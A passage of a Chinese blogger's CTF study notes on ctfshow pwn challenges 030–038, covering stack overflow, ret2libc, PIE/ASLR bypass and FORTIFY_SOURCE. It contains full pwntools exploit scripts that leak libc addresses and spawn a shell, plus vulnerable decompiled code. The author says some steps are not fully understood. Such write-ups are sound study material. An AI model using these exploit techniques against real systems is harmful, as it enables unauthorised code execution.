class="line"><span class="comment">调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 &amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">程序中无system也没有“/bin/sh”字符串，也可以使用ret2libc的方法进行get shell 后面到该部分会进行详细讲解，同样在这里仅仅是为了演示在关闭Canary和PIE保护，开启NX保护时的一种攻击手法</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28145</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 创建elf对象</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  <span class="comment"># 获取ctfshow函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload以泄露write函数在libc中的地址</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">140</span> +p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)  <span class="comment"># 不是很懂。。</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用泄漏的write地址来确定libc基地址，进而计算system函数和/bin/sh字符串的地址</span></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造新的payload，这次是调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload2 = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>这题没太懂。</li>
<li>还差点前置知识喵。</li>
</ul>
<h3 id="031-ALSR和PIE开启"><a class="header-anchor" href="#031-ALSR和PIE开启">¶</a>031 ALSR和PIE开启</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn031/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">32位  仅关闭Canary保护</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);  <span class="comment">// 程序先打印出main函数的地址</span></span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_854);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8C8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_944);</span><br><span class="line">  <span class="built_in">puts</span>(asc_9D0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_AE4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B78);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Bypass ALSR &amp; PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有溢出，但是开启了保护，所以之前的exp打不了</span></span><br></pre></td></tr></table></figure>
<ul>
<li>已知main函数地址，可以通过计算偏移得到程序本身的加载地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从程序输出中读取main函数的地址。通常，这一步需要在二进制程序中有特定的输出，以便读取main函数的地址</span></span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算二进制文件的基地址，这是通过从读取到的main函数地址减去main函数在ELF文件中的偏移量得出的</span></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用基地址来计算ctfshow函数地址、write函数的PLT地址、write函数的GOT地址以及一个用于存放参数的寄存器（ebx）的地址</span></span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span>  <span class="comment"># 这个怎么得到的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload来泄露write函数在libc中的地址</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())  <span class="comment"># 这行不太懂。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用泄漏的write地址来确定libc基地址，进而计算system函数和/bin/sh字符串的地址</span></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload来调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 远程exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28161</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="032-FORTIFY-SOURCE-0"><a class="header-anchor" href="#032-FORTIFY-SOURCE-0">¶</a>032 FORTIFY_SOURCE=0</h3>
<ul>
<li>
<p>禁用Fortify功能，不会进行任何额外的安全检查，可能导致潜在的安全漏洞</p>
</li>
<li>
<p>FORTIFY_SOURCE 是一个 C/C++ 编译器提供的安全保护机制，旨在<strong>防止缓冲区溢出</strong>和<strong>其他与字符串和内存操作相关</strong>的安全漏洞。它是在<strong>编译时自动插入</strong>的一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。</p>
</li>
<li>
<p>FORTIFY_SOURCE 提供了以下主要功能：</p>
</li>
<li>
<p><strong>1. 运行时长度检查</strong></p>
<ul>
<li>FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如 strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</li>
</ul>
</li>
<li>
<p><strong>2. 缓冲区溢出检测</strong>：</p>
<ul>
<li>FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy 、 memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出</li>
</ul>
</li>
<li>
<p><strong>3. 安全警告和错误报告：</strong></p>
<ul>
<li>当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告</li>
</ul>
</li>
<li>
<p>FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn032/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位  仅关闭Canary保护</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v5 = strtol(argv[<span class="number">3</span>], <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf1, argv[<span class="number">2</span>], v5);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一题关闭了此保护，输入的argv1明显会导致buf1溢出，但是程序仍可以正常运行 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">Undefined</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;The source code of these three programs is the same, and the results of turning on different levels of protection are understood\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You should understand the role of these protections!But don&#x27;t just get a flag\nHere is your flag:\n&quot;</span>);</span><br><span class="line">  v0 = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, v0);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打开并打印flag */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn AAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB 6</span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB CTFshowPWN</span><br><span class="line">A AAAAAAAAAAA</span><br><span class="line">%2$x</span><br><span class="line">be8b8d0</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
<ul>
<li>这个知识点不太懂。。</li>
</ul>
<h3 id="033-FORTIFY-SOURCE-1"><a class="header-anchor" href="#033-FORTIFY-SOURCE-1">¶</a>033 FORTIFY_SOURCE=1</h3>
<ul>
<li>启用 Fortify 功能的基本级别。</li>
<li>在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行</li>
</ul>
<p>to be continued</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【Pvvn】037-072知识点记录</title>
    <url>/project/2024/07/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91037-072%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p>跟着做的同时自己记录一下</p>
</li>
<li>
<p>vvp的链接：<a href="https://brocademaple.github.io/2024/07/16/CS_Notes/PWN/%5BPwn%5Dwp%E5%AD%98%E6%A1%A3/">【Puun】uup留档 | BROCADEMAPLE</a></p>
</li>
</ul>
<h3 id="037-栈溢出-后门函数（32位）"><a class="header-anchor" href="#037-栈溢出-后门函数（32位）">¶</a>037 栈溢出+后门函数（32位）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn037/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位 关闭了栈保护与PIE </span><br><span class="line">→可以直接修改栈上的返回地址来攻击</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just very easy ret2text&amp;&amp;32bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  	[esp+6h]：这表示buf数组的起始地址相对于ESP（栈指针）的偏移量</span></span><br><span class="line"><span class="comment">  	ESP通常指向栈顶，在函数调用时，ESP会在每次压栈操作后向下移动</span></span><br><span class="line"><span class="comment">  	[ebp-12h]：这表示buf数组的起始地址相对于EBP（基址指针）的偏移量</span></span><br><span class="line"><span class="comment">  	</span></span><br><span class="line"><span class="comment">  	</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首先声明一个名为buf的字符数组，大小为14字节，距离ebp的距离为0x12</span></span><br><span class="line"><span class="comment">	通过read函数能够读入0x32（十六进制），转为十进制就是50个字节的数据</span></span><br><span class="line"><span class="comment">	▷存在栈溢出</span></span><br><span class="line"><span class="comment">	→当读入的数据超过buf的大小时，可以覆盖后续的栈帧数据，包括返回地址*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 利用栈移除，可以通过构造payload覆盖返回地址，使其指向backdoor函数的地址 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>直接进行溢出，覆盖返回地址，再输入后门函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)  测试本地pwn</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28216</span>)  <span class="comment"># 连接远程服务，参数为服务的主机名和端口号</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)  <span class="comment"># 创建了一个ELF对象，它用于分析和操作名为pwn的二进制文件。ELF对象提供了多种方法来访问二进制文件的内部结构，如符号表、节头表、段头表等。在这个场景下，我们需要找到backdoor函数的地址，所以ELF对象是必不可少的</span></span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]  <span class="comment"># 通过ELF对象的sym属性获取了backdoor函数在内存中的地址。elf.sym实际上是一个字典，其中键是符号的名字，值是该符号在二进制文件中的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x12</span> + <span class="number">4</span>) + p32(backdoor)  <span class="comment"># 其中&#x27;A&#x27; * (0x12 + 4)是填充部分，用来覆盖函数调用后的返回地址；p32(backdoor)将backdoor函数的地址转换为32位的小端格式，以便正确地放置在payload中  </span></span><br><span class="line"><span class="comment"># 这个地方没太懂</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()  <span class="comment"># 接收服务器的响应</span></span><br><span class="line"></span><br><span class="line">io.interactive()  <span class="comment"># 进入交互模式，允许手动操作shell</span></span><br></pre></td></tr></table></figure>
<ul>
<li>获得shell</li>
<li><code>cat /ctfshow_flag</code></li>
<li>ctfshow{b699b9f5-e8cd-41d1-b925-8ce4121dd3c6}</li>
</ul>
<h3 id="038-栈溢出-后门函数（64位）"><a class="header-anchor" href="#038-栈溢出-后门函数（64位）">¶</a>038 栈溢出+后门函数（64位）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn038/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位  关闭栈保护和PIE</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400890);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_4009A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400A30);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400AB8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400B50);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just easy ret2text&amp;&amp;64bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>与32位不同之处</strong>：需要考虑到堆栈平衡加上ret返回地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28294</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400287</span>  <span class="comment"># 0x0000000000400287 : ret</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xA</span>+<span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"><span class="comment"># 这里的b&#x27;a&#x27; * (0xA+8)是用来填充的，0xA对应buf数组的大小（10字节），加上额外的8字节以覆盖返回地址。p64(ret)和p64(backdoor)分别用于插入ret gadget和backdoor函数的地址。</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()  <span class="comment"># 接收响应</span></span><br><span class="line"></span><br><span class="line">io.interactive()  <span class="comment"># 进入交互模式</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">返回地址的覆盖：</span></span><br><span class="line"><span 